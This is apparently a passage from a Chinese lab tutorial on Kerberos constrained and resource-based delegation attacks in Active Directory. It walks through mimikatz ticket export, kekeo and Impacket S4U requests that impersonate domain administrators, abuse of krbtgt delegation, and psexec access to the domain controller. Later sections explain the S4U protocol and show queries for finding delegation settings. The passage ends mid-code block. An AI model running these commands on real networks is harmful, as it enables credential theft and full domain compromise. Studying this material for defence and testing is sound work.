+<p>域：hack.lab</p>
+<p>域控服务器（server 2019）：172.16.0.106     域管理用户：dc_admin  域控主机名：dc</p>
+<p>域内主机 （Windows 10）：172.16.0.111     本地管理员：xd32 域普通用户：testsql  域控主机名：sql</p>
+<p>域内主机 （Windows 7）：172.16.0.105     本地管理员：sc92n  域普通用户：testsql  域控主机名：win7a</p>
+<p>这里分为使用主机账户和服务账户的攻击方式，不过都是大同小异。</p>
+<h2 id="实战-主机账户">实战-主机账户</h2>
+<p>我们先在域控把主机win7a开启约束委派,允许委派访问到SQL主机的cifs服务：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/24.png" alt="24"></p>
+<p>现在我们回到下面这台主机进行操作：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">域内主机 （Windows 7）：172.16.0.105    本地管理员：sc92n  域控主机名：win7a
+</span></span></code></pre></div><p>因为我们已经等了在这台开启了约束委派的主机上了，而且拥有本地管理员权限，我们这里使用的是mimikatz工具，直接导出TGT即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">sekurlsa::tickets /export
+</span></span></code></pre></div><p>如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/25.png" alt="25"></p>
+<p>假如你没有导出的权限或者没有登录这台主机，但是拥有主机账户的ntlm hash可以使用kekeo工具申请一张TGT：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tgt::ask /user:win7a$ /domain:hack.lab /ntlm:主机账户的hash
+</span></span></code></pre></div><blockquote>
+<p>如果是使用密码就把ntlm改成password即可</p>
+</blockquote>
+<p>如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/26.png" alt="26"></p>
+<p>现在我们使用这张TGT伪造一张域管理员的票据，去申请访问SQL主机的cifs服务，我们在kekeo执行下面的命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tgs::s4u /tgt:TGT_win7a$@HACK.LAB_krbtgt~hack.lab@HACK.LAB.kirbi /user:dc_admin /service:cifs/sql.hack.lab
+</span></span></code></pre></div><p>如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/27.png" alt="27"></p>
+<p>现在我们就拿着这张伪造的票据使用kekeo或者mimikatz导入内存，然后访问SQL主机上面的文件，还可以访问域管理员在SQL主机登录后留下的文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kerberos::ptt TGS_dc_admin@HACK.LAB@HACK.LAB_cifs~sql.HACK.LAB@HACK.LAB.kirbi
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/28.png" alt="28"></p>
+<h2 id="实战-服务账号生成黄金票据">实战-服务账号（生成黄金票据）</h2>
+<p>既然上面介绍了主机账户约束委派的攻击，实现了伪造域控管理员远程访问SQL主机的cifs服务。</p>
+<p>服务账号也是一样的操作，只不过是把参数里面的user更换成服务账号就行了，下面我们可以利用这种攻击方式实现生成黄金票据。</p>
+<p>我们都知道TGT的生成是由<code>krbtgt</code>用户加密和签名的，如果我们能委派域上的用户去访问<code>TGS</code>，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用<code>krbtgt</code>的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。</p>
+<p>由于<code>krbtgt</code>默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。我们可以使用powershell在域控上面来添加：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Import-Module ActiveDirectory
+</span></span><span class="line"><span class="cl">$user = Get-ADUser testsql
+</span></span><span class="line"><span class="cl">Set-ADObject $user -Add @{ &#34;msDS-AllowedToDelegateTo&#34; = @(&#34;krbtgt/hack.lab&#34;) }
+</span></span></code></pre></div><blockquote>
+<p><strong>注</strong>：域控默认安装ActiveDirectory，如果没有安装，可以下载dll：<a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">下载地址</a>，然后导入就行了：<code>import-module .\Microsoft.ActiveDirectory.Management.dll</code></p>
+</blockquote>
+<p>执行后会在GUI界面看到krbtgt已经被添加到里面了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/29.png" alt="29"></p>
+<blockquote>
+<p>同学们如果发现自己设置的用户没有委派的选项，那是还没有成为服务账号，可以通过博客的另外一篇文章域渗透-SPN学习</p>
+<p>或者临时加一个输入setspn -s MSSQLSvc/win7a.hack.lab testsql ，这样testsql就成为服务账号了</p>
+</blockquote>
+<p>好了，现在我们回到win7a的主机上。我们现在有两种情况：</p>
+<ul>
+<li>拿到win7a主机的本地管理员权限，发现testsql用户在本机登录过，但没有密码，可以使用mimikatz导出TGT伪造TGS</li>
+<li>拿到testsql用户的hash或者密码，直接申请TGT，然后伪造TGS（这个过程不需要管理员权限）</li>
+</ul>
+<h3 id="kekeo">kekeo</h3>
+<p>相信大家通过上面的实战已经很熟悉了，下面我们就利用testsql用户就行攻击，现在我们已经知道了该用户的密码，我们使用kekeo申请一张TGT：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kekeo.exe &#34;tgt::ask /user:testsql /domain:hack.lab /password:p@ssw0rd&#34; exit
+</span></span></code></pre></div><p>如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/30.png" alt="30"></p>
+<p>下面我们通过这张TGT申请获取HACK\dc_admin访问krbtgt/HACK.LAB的TGS，即HACK\dc_admin的TGT：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kekeo.exe &#34;tgs::s4u /tgt:TGT_testsql@HACK.LAB_krbtgt~hack.lab@HACK.LABkirbi /user:Administrator@hack.lab /service:krbtgt/HACK.LAB&#34; exit
+</span></span></code></pre></div><p>出现了报错：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/31.png" alt="31"></p>
+<p>后来看先知的一篇文章知道：<code>2012 及以后的KDC，受限委派的机制变成了Resource Based Constrained Delegation导致的</code></p>
+<p>这里我又重新使用Windows Server 2008搭建了一个域和域内主机，具体环境如下：</p>
+<p>域：safe.lab</p>
+<p>域控服务器（server 2008）：172.16.0.118     域管理用户：dc_admin  域控主机名：dc2008</p>
+<p>域内主机 （Windows 7）：172.16.0.108     本地管理员：sc92n  域普通用户：test  域控主机名：win7c</p>
+<p>重新设置了服务账号和添加krbtgt：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">setspn -s MSSQLSvc/win7c.safe.lab test
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="p">=</span> <span class="nb">Get-ADUser</span> <span class="n">test</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ADObject</span> <span class="nv">$user</span> <span class="n">-Add</span> <span class="vm">@</span><span class="p">{</span> <span class="s2">&#34;msDS-AllowedToDelegateTo&#34;</span> <span class="p">=</span> <span class="vm">@</span><span class="p">(</span><span class="s2">&#34;krbtgt/safe.lab&#34;</span><span class="p">)</span> <span class="p">}</span>
+</span></span></code></pre></div><p>设置如下：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/32.png" alt="32"></p>
+<p>现在我们使用test用户登录在win7c上使用kekeo工具进行操作：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kekeo.exe &#34;tgt::ask /user:test /domain:safe.lab /password:p@ssw0rd&#34; exit
+</span></span><span class="line"><span class="cl">kekeo.exe &#34;tgs::s4u /tgt:TGT_test@SAFE.LAB_krbtgt~safe.lab@SAFE.LABkirbi /user:Administrator@safe.lab /service:krbtgt/SAFE.LAB&#34; exit
+</span></span></code></pre></div><p>可以看到已经成功申请到<strong>Administrator</strong>的TGT票据了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/33.png" alt="33"></p>
+<p>我们继续把生成的TGT票据进行导入内存：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kekeo.exe &#34;kerberos::ptt /tgt:TGS_administrator@safe.lab@SAFE.LAB_krbtgt~safe.lab@SAFE.LAB.kirbi&#34; exit
+</span></span></code></pre></div><p>并连接winrm服务，Windows Server 2008 R2需要执行以下命令开启WinRM服务：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">winrm quickconfig -q
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Enter-PSSession -ComputerName DC
+</span></span></code></pre></div><p>可以看到我们可以已经控制了域控服务器了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/34.png" alt="34"></p>
+<h3 id="impacket">Impacket</h3>
+<p>我们还可以用<a href="https://github.com/SecureAuthCorp/impacket">impacket</a>系列的<code>getST</code>向KDC请求administrator的TGT，当中相关的配置可以去参考<a href="https://xxe.icu/posts/ad_ptt/#impacket">域渗透-票据传递攻击</a></p>
+<p>那下面我们就开始操作，kali新版是内置了impacket的，直接执行即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getST.py -dc-ip 172.16.0.118 -spn krbtgt/safe.lab -impersonate Administrator safe.lab/test:p@ssw0rd
+</span></span></code></pre></div><blockquote>
+<p>-impersonate：表示伪造用户</p>
+<p>-spn：表示我们要委派的服务的spn，这里是TGS</p>
+<p>-dc-ip：域控ip</p>
+</blockquote>
+<p>执行之后会在当前目录生成一个缓存文件<code>Administrator.ccache</code>，如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/35.png" alt="35"></p>
+<p>还是讲一下krb5的配置吧，在kali的/etc/hosts文件中添加下面内容：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">172.16.0.118 safe.lab
+</span></span><span class="line"><span class="cl">172.16.0.108 win7c
+</span></span><span class="line"><span class="cl">172.16.0.118 dc2008
+</span></span></code></pre></div><p>设置/etc/krb5.conf：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[libdefaults]
+</span></span><span class="line"><span class="cl">        default_realm = safe.lab
+</span></span><span class="line"><span class="cl">[realms]
+</span></span><span class="line"><span class="cl">        safe.lab = {
+</span></span><span class="line"><span class="cl">                kdc = tcp/dc2008:88
+</span></span><span class="line"><span class="cl">        }
+</span></span></code></pre></div><p>设置一下环境变量：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</span></span></code></pre></div><p>最后用psexec.py去连接：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">psexec.py safe.lab/administrator@dc2008 -k -no-pass
+</span></span></code></pre></div><p>可以看到已经拿到域控的权限了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/36.png" alt="36"></p>
+<h2 id="原理-1">原理</h2>
+<p>微软很早就意识到非约束委派并不是特别安全，在 Windows 2003上发布了&quot;约束&quot;委派。 其中包括一组 Kerberos 协议扩展，也就是 S4U2Self 和 S4U2Proxy两个扩展，这两个扩展都允许服务代表用户从KDC请求票证。</p>
+<p>其中S4U支持两个子协议：Service for User to Self (<code>S4U2Self</code>)和 Service for User to Proxy (<code>S4U2proxy</code>)，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self可以代表自身请求针对其自身的可转发的Kerberos服务票据(ST1)</code>；<code>S4U2proxy可以以用户的名义请求其它服务的ST2</code>，约束委派就是限制了S4U2proxy扩展的范围。</p>
+<p>其中：</p>
+<p><code>S4U2Self</code>（用用户的TGT向KDC请求用户的可转发的ST1，再用这张ST1去发起S4U2proxy请求。）
+通过此扩展可以拿到一张标识任意用户身份的ST，它的作用其实是<code>协议转换</code>。有时用户会通过<code>其他协议</code>（例如NTLM或什至基于表单的身份验证）对服务进行身份验证，因此他们不会将TGS发送给服务。在这种情况下，服务可以<code>调用S4U2Self来要求身份验证服务为其自身的任意用户生成TGS</code>，然后可以在调用S4U2Proxy时将其用作依据。例如网站A服务器可以使用它去向KDC请求一张用户B身份的ST1，网站A服务器再用这张ST1去发起S4U2proxy请求。</p>
+<p><code>S4U2proxy</code>（拿用户的可转发的ST1请求用于访问服务器的ST2）
+该拓展作用是使用一张用户A身份的ST1去向KDC请求一张用于访问文件服务器B的ST2，这张ST2的身份还是用户的，这样的话网站A就可以利用用户A的权限去访问文件服务器B上的文件了。</p>
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_2214804a-4a44-46f4-b6d2-a78f4ff39a39">Server-for-User-to-Self (S4U2self)</a>扩展旨在用于用户以某种方式而不是使用 Kerberos 对服务进行身份验证时使用。例如，用户可以通过 Web 服务器专用的某种方式向 Web 服务器进行身份验证。然后，Web 服务器可以使用 S4U2self 获取带有<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_0eef5aca-03f3-4b09-b79b-cdf7f730ad89">授权数据</a>的票证，就像用户最初使用 Kerberos 一样。 这通过使所有决策路径的行为就像使用了 Kerberos 一样简化了服务器的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_5946f74c-27ca-4ef8-8630-f1a06cd8d59e">授权决策。</a>S4U2self 主要使用 KDC 来获取有关用户的信息，以使调用者自己受益。<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_30e42141-9b8e-4fa1-852e-b4bb996ccf13">用户代理服务 (S4U2proxy</a> )扩展允许呼叫者联系其他一些服务，代表用户行事。下图给出了详细的概述。</p>
+<p><img src="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ms-sfu_files/image002.png" alt="S4U2self 和 S4U2proxy"></p>
+<p><strong>图 2：S4U2self 和 S4U2proxy</strong></p>
+<p>S4U2self 描述在上图的上半部分。使用此扩展，服务会接收到服务本身的服务票证（不能在其他地方使用的票证）。</p>
+<p>上图描述了以下协议步骤：</p>
+<ol>
+<li>
+<p>用户的机器向服务 1 发出请求。用户通过了身份验证，但服务 1 没有用户的授权数据。这通常是由于身份验证是通过 Kerberos 以外的其他方式执行的。</p>
+</li>
+<li>
+<p>服务 1 已通过 KDC 进行身份验证并获得其 TGT，通过 S4U2self 扩展代表指定用户向自己请求服务票证。 用户由S4U2self 数据中的用户名和用户领域名称标识。或者，如果服务 1 拥有用户的证书，它可以使用证书向 KDC 使用<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/cd9d5ca7-ce20-4693-872b-2f5dd41cbff6">PA-S4U-X509-USER</a> 结构识别用户。</p>
+</li>
+<li>
+<p>KDC 会返回一个发往服务 1 的服务票证，就好像它是使用用户自己的 TGT 向用户请求的一样。服务票证可能包含用户的授权数据。</p>
+</li>
+<li>
+<p>服务 1 可以使用服务票证中的授权数据来满足用户的请求。然后服务响应用户。</p>
+<p><code>尽管 S4U2self 向服务 1 提供有关用户的信息，但此扩展不允许服务 1 代表用户提出其他服务的请求。这就是S4U2proxy的作用。这里就是为什么受限的原因了</code></p>
+</li>
+<li>
+<p>用户的机器向服务 1 发出请求。服务 1 需要以用户身份访问服务 2 上的资源。但是，服务 1 没有来自用户的转发 TGT 来通过转发 TGT 执行委派，如图中指定使用转发 TGT 的 Kerberos 委派中所述。两个前提条件适用于此步骤。首先，服务 1 已经通过 KDC 进行了身份验证，并且具有有效的 TGT。其次，服务 1 有一个从用户到服务 1 的可转发服务票证。这个可转发服务票证可能是通过 [RFC4120] 第 3.2 节中指定的<strong>KRB_AP_REQ</strong> 消息或通过 S4U2self 请求获得的。</p>
+</li>
+<li>
+<p>服务 1 代表指定用户向服务 2 请求服务票证。用户由服务 1 的服务票证中的客户端名称和客户领域标识。要返回的票证中的授权数据也从服务票证中复制。</p>
+</li>
+<li>
+<p>如果请求中包含<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_26456104-0afb-4afe-a92e-ac160a9efdf8">特权属性证书 (PAC)</a>，则 KDC 通过检查 PAC 结构的签名数据来验证 PAC，如[<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962">MS-PAC]</a> 第 2.8 节中所述。如果 PAC 有效或不存在，KDC 会返回服务 2 的服务票证，但存储在服务票证的<strong>cname</strong>和<strong>crealm</strong> 字段中的客户端身份是用户的身份，而不是服务 1 的身份。</p>
+</li>
+<li>
+<p>服务 1 使用服务票证向服务 2 发出请求。服务 2 将此请求视为来自用户，并假定用户已通过 KDC 身份验证。</p>
+</li>
+<li>
+<p>服务 2 响应请求。</p>
+</li>
+<li>
+<p>服务 1 响应用户对消息 5 的请求。</p>
+</li>
+</ol>
+<p>简而言之一句话： 如果 service1 有了 protocol transition 权限的话，service1 可以<strong>以任何一个域内用户的身份</strong>向 KDC 申请一张访问 service1 自身的票据，<strong>而且不需要知道目标用户的密码</strong>。比如 service1 可以以域管理员 Administrator 的身份向 KDC 申请一张访问 service1自身的票据。（如果你能找到这么一个服务，并且可以通过这个服务执行代码的话，你是有可能直接利用这个功能提权至域管理员的，当然这个时候你获取到的域管权限是被限制在这台机器上的，无法访问别的服务器。）</p>
+<p>所以大家也可以想想约束委派和非约束委派的区别，首先非约束委派要域管理员访问才能获取到TGT，而约束委派则是能调用S4U2这个协议获取到任何域内用户的TGT，约束的点也在这个协议上，所以它拿到的TGS也就是ST票据也有局限性。</p>
+<p>通过命令行打开adsiedit.msc查看testsql用户属性，可以看到：</p>
+<p>当被设置为约束委派的时候，它的userAccountControl会包含TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION字段。</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/37.png" alt="37"></p>
+<p>并且比非约束委派的账户多了msDS-AllowedToDelegateTo字段，里面包含了允许委派的服务：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/38.png" alt="38"></p>
+<h2 id="发现约束委派信息">发现约束委派信息</h2>
+<h3 id="adfind-1">AdFind</h3>
+<p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">AdFind</a>工具使用LDAP协议查询域内的各种信息，下面是查询约束委派服务账号以及对应的委派对象：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">AdFind</span><span class="p">.</span><span class="py">exe</span> <span class="n">-b</span> <span class="s2">&#34;DC=hack,DC=lab&#34;</span> <span class="o">-f</span> <span class="s2">&#34;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&#34;</span> <span class="n">cn</span> <span class="n">distinguishedName</span> <span class="nb">msds-allowedtodelegateto</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/39.png" alt="39"></p>
+<p>当然也可以查询约束委派主机账号以及对应的委派对象：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AdFind.exe -b &#34;DC=hack,DC=lab&#34; -f &#34;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&#34; cn distinguishedName msds-allowedtodelegateto
+</span></span></code></pre></div><h3 id="powerview-1">PowerView</h3>
+<p>查询约束委派的服务账号：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module .\powerview.ps1;Get-DomainUser -TrustedToAuth -Domain hack.lab | select name }&#34;</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/40.png" alt="40"></p>
+<p>查询约束委派的主机账号：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module .\powerview.ps1;Get-DomainComputer -TrustedToAuth -Domain hack.lab | select name}&#34;</span>
+</span></span></code></pre></div><h3 id="inddelegationpy">indDelegation.py</h3>
+<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py">findDelegation.py</a>是集成在impacket工具包中的一款工具，具体用法如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">findDelegation.py -dc-ip 172.16.0.106 -target-domain hack.lab hack.lab/lucky:p@ssw0rd
+</span></span></code></pre></div><p>结果如图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/41.png" alt="41"></p>
+<h3 id="ldapsearch-1">ldapsearch</h3>
+<p>这款是kali自带，可以在域外使用。</p>
+<p>查找域中配置约束委派的服务账号：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -LLL -x -H ldap://172.16.0.106:389 -D <span class="s2">&#34;lucky@hack.lab&#34;</span> -w <span class="s2">&#34;p@ssw0rd&#34;</span> -b <span class="nv">dc</span><span class="o">=</span>hack,dc<span class="o">=</span>lab  <span class="s2">&#34;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&#34;</span> cn distinguishedName msds-allowedtodelegateto
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/42.png" alt="42"></p>
+<p>查找域中配置约束委派的主机账号：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -LLL -x -H ldap://172.16.0.106:389 -D <span class="s2">&#34;lucky@hack.lab&#34;</span> -w <span class="s2">&#34;p@ssw0rd&#34;</span> -b <span class="nv">dc</span><span class="o">=</span>hack,dc<span class="o">=</span>lab  <span class="s2">&#34;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&#34;</span> cn distinguishedName msds-allowedtodelegateto
+</span></span></code></pre></div><h1 id="0x03-基于资源的约束委派rbcd">0x03 基于资源的约束委派（RBCD）</h1>
+<h2 id="原理-2">原理</h2>
+<p>这个还是得从原理开始介绍，下面大家跟着了解一下再实战。</p>
+<p>传统的委派，在设置的过程中其实都是需要SeEnableDelegation特权，而这个特权需要域管理员才能设置。相对于传统的委派，基于资源的约束委派它不需要域管理员设置，而是机器本身。</p>
+<p><strong>约束委派和基于资源的约束委派的区别：</strong></p>
+<p>前者：<code>通过服务A委派到服务B</code>，实际是在服务A上增加TRUSTED_FOR_DELEGATION字段（<code>非约束委派</code>），TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION和msDS-AllowedToDelegateTo （<code>约束委派</code>）字段来达到委派的目的。</p>
+<p>后者：<code>通过服务B允许服务A委派到服务B</code>，实际是通过服务B自身赋予msDS-AllowedToActOnBehalfOfOtherIdentity字段，从而允许服务A对服务B的基于资源的约束委派。</p>
+<p>所以当利用到基于资源的约束委派的时候，<code>服务A的两个字段是没有赋值的</code>，当这两个字段没有被赋值的时候，通过S4U2Self得到的ST服务票证是<code>不可被转发</code>的，而S4U2Proxy的作用就是<code>将可转发的ST票据转发到其他服务</code>进行委派认证。但是：在基于资源的约束委派过程中，不可转发的ST仍可以通过S4U2Proxy转发到其他服务进行委派认证，并且最后还会返回一张可转发的ST服务票证。</p>
+<p>因此，如果能够在服务B上配置允许服务A的基于资源的约束委派，那么就可以通过控制服务A使用S4U2Self向域控请求任意用户访问自身的服务票据，最后再使用S4U2Proxy转发此ST1票据去请求访问服务B的可转发的ST2服务票据，就可以模拟任意用户访问服务B了。这里可以以普通域用户的身份去创建机器账号作为服务A。</p>
+<p>简单的讲，也就是如果攻击者能够在Service B的机器上设置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性为Service A，也就允许Service A利用s4u2self协议代表其他用户身份来访问Service B的话，那我们就可以做到提权等操作。</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/43.png" alt="43"></p>
+<p>那怎么才有设置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限呢，也就是有<strong>WriteProperty</strong>的权限。</p>
+<p>举个例子：小明刚来到公司入职，公司发了一个账号lucky和密码为p@ssword让他设置一下新电脑。他需要把新电脑加入域hack.lab，于是他开始操作：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/45.png" alt="45"></p>
+<p><code>win7a</code> （机器名）这台机器在加域的时候填写的域内账户是 <code>lucky</code>，那么 <code>lucky</code> 这个域用户就有修改 <code>win7a</code> （机器名）这台主机的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的权限。</p>
+<p><strong>在大型内网域环境中，将机器加入到域环境中一般不会用域管权限，而是用一个专门加域的域用户（例如上图的 lucky 就是一个加域用户）去操作。那么当我们拿下该域用户的账号密码时，就可以把通过该域用户加入到域里的所有机器都拿下。</strong></p>
+<p>默认情况下以下账户拥有修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限：</p>
+<ul>
+<li><strong>Domain Admins</strong>(域管理员)</li>
+<li><strong>mS-DS-CreatorSID</strong>(将该机器加入域的账户)</li>
+<li><strong>NT AUTHORITY\SELF</strong>(机器账户本身)</li>
+</ul>
+<h2 id="查找可控的机器">查找可控的机器</h2>
+<p>攻击者可以查询域内计算机的 <code>mS-DS-CreatorSID</code>，这个值代表的是将计算机加入到域内的用户，它是具有修改 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的权限的，如果我们可以拿到那个用户的凭据，就可以控制那个用户添加到域内的所有的电脑。</p>
+<p>关于mS-DS-CreatorSID这个值，我们可以使用adsiedit.msc查看，也可以使用<a href="https://download.sysinternals.com/files/AdExplorer.zip">AdExplorer</a>进行查询：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/46.png" alt="46"></p>
+<p>那这个1114就是对应我们加入域的用户了，可以在lucky登录情况下使用whoami /all 来查询：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/47.png" alt="47"></p>
+<p>那我们知道查找的原理 了，我们可以在lucky登录的任何一台机器上使用下面的工具进行查询：</p>
+<h3 id="adfind-2">AdFind</h3>
+<p>通过ADFind查找将域机器拉入域的用户的SID：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AdFind.exe -b &#34;DC=hack,DC=lab&#34; -f &#34;(&amp;(samAccountType=805306369))&#34; cn mS-DS-CreatorSID
+</span></span></code></pre></div><p>可以看到在WIN7A这台主机有sid，其他主机没有的原因是域管理员账号加入域的：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/48.png" alt="48"></p>
+<p>查看S-1-5-21-3896163557-1645138957-2306563325-1114是谁：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AdFind.exe -b &#34;DC=hack,DC=lab&#34; -f &#34;(&amp;(objectsid=S-1-5-21-3896163557-1645138957-2306563325-1114))&#34; objectclass cn dn
+</span></span></code></pre></div><p>可以看到是用户lucky：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/49.png" alt="49"></p>
+<h3 id="powerview-2">Powerview</h3>
+<p>照样是在lucky登录的情况，利用 powerview 查看当前用户 SID，并查看当前用户对某台主机是否有写权限：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># 查看 SID</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="p">[</span><span class="no">userName</span><span class="p">]</span> <span class="n">-Properties</span> <span class="n">objectsid</span>
+</span></span><span class="line"><span class="cl">
